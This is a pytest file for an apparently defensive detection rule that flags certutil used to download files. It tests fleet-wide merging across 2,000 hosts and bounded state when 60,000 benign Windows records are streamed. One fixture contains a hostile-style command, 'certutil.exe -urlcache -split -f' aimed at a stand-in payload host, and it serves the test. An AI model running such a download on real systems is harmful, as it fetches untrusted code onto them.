"""Mission-scale behaviour: fleet merging stays bounded, and large volumes stream without unbounded state."""

from __future__ import annotations

from datetime import UTC, datetime, timedelta

from romulus.detect.windows_proxy import CertutilDownloadDecode
from romulus.evidence.normalize import normalize_hits
from romulus.evidence.windows import normalize_windows
from romulus.evidence.windows_catalog import SYSMON, SYSMON_CHANNEL
from tests.windows_fixtures import LogicalWindowsEvent, mission_windows_volume, windows_hit

_START = datetime(2026, 1, 2, 4, 0, 0, tzinfo=UTC)


def _certutil_download(host: str, ordinal: int):
    data = {
        "UtcTime": (_START + timedelta(milliseconds=ordinal)).strftime("%Y-%m-%d %H:%M:%S.000"),
        "ProcessGuid": f"{{00000000-0000-0000-0000-{ordinal:012x}}}", "ProcessId": "1000", "ParentProcessId": "700",
        "Image": r"C:\Windows\System32\certutil.exe",
        "CommandLine": "certutil.exe -urlcache -split -f http://payload.test/a http://payload.test/a",
    }
    event = LogicalWindowsEvent(SYSMON_CHANNEL, SYSMON, 1, host, 200_000 + ordinal,
                                (_START + timedelta(milliseconds=ordinal)).isoformat().replace("+00:00", "Z"), data)
    return normalize_windows(windows_hit(event, "elastic_agent"))


def test_a_repeating_shape_merges_into_one_fleet_finding_across_many_hosts():
    rule = CertutilDownloadDecode()
    events = [_certutil_download(f"ws{n:04d}.example.test", n) for n in range(2_000)]
    by_id = {e.id: e for e in events}
    rule.load = lambda ids: [by_id[i] for i in ids if i in by_id]

    immediate = list(rule.consume(events))
    rule.drain_staged()
    rule.drain_bounds()
    final = rule.finalize()

    # the first IMMEDIATE_HOSTS hosts are reported record by record; the rest merge into one fleet finding
    assert len(immediate) == rule.IMMEDIATE_HOSTS
    assert all(match.claim_type == "observed_action" for match in immediate)
    [fleet] = final
    assert fleet.claim_type == "aggregate_observation"
    assert "further process-creation record(s)" in fleet.claim
    assert fleet.proposed_lane == "lead"            # the shape's lane is kept, never lowered to context
    # bounded state: one group and one host entry per host, not one row per record
    assert len(rule.groups) == 1
    assert len(rule.shape_hosts) == 2_000


def test_mission_volume_streams_in_batches_without_unbounded_growth():
    rule = CertutilDownloadDecode()
    rule.load = lambda ids: []
    seen = 0
    # 60k benign records in batches; the factory's templates never match certutil-download, so nothing is published,
    # and the rule's per-key stores never grow with the number of records read.
    batch: list = []
    for hit in mission_windows_volume(60_000, shape="elastic_agent"):
        events, _skips, _errors = normalize_hits([hit])
        batch.extend(events)
        if len(batch) >= 5_000:
            assert rule.consume(batch) == []
            rule.drain_staged()
            rule.drain_bounds()
            seen += len(batch)
            batch = []
    if batch:
        assert rule.consume(batch) == []
        seen += len(batch)
    assert seen >= 60_000
    assert rule.finalize() == []
    assert len(rule.groups) == 0 and len(rule.shape_hosts) == 0
